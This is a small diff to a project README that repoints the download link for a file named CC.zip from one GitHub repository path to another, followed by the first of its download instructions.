@@ -24,7 +24,7 @@ The following resources and libraries were utilized in the development of this a
 
 This repository contains a file named `CC.zip`. You can download it directly using the link below:
 
-## 📥 [Download CC.zip](https://github.com/SeanAminov/dev-01-07/raw/main/CC.zip)
+## 📥 [Download CC.zip](https://github.com/SeanAminov/CleverCash/raw/main/CC.zip)
 
 ### Instructions
 1. Click the link above to download the file.
